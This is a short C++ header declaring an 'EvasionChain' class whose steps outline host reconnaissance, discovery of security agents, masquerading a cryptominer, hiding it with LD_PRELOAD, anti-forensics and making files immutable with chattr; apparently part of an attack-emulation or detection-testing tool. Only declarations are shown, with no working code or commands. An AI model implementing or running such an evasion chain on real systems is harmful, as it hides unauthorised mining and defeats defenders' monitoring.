#pragma once

#include "config.hpp"
#include "http_client.hpp"

#include <filesystem>

namespace evasion {

class EvasionChain {
 public:
  explicit EvasionChain(Config cfg);

  void run_all() const;
  void step01_host_recon() const;
  void step02_discover_agents() const;
  void step03_masquerade_miner() const;
  void step04_ld_preload_hide() const;
  void step05_anti_forensics() const;
  void step06_chattr_immutable() const;

 private:
  Config cfg_;
  HttpClient http_;

  std::filesystem::path staging(const std::string& name) const;
};

}  // namespace evasion
